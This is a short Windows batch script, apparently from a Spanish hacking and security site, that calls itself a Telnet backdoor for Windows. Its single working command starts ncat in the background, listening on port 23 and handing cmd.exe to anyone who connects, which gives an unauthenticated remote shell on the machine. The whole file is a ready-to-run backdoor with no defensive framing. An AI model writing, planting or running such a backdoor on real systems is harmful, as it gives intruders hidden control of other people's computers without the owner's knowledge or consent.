@echo off
echo "2020 (c) hackingyseguridad.com" 
echo "Puerta trasera Telnet para Windows"
start /B ncat -l -t -p 23 -e cmd.exe 
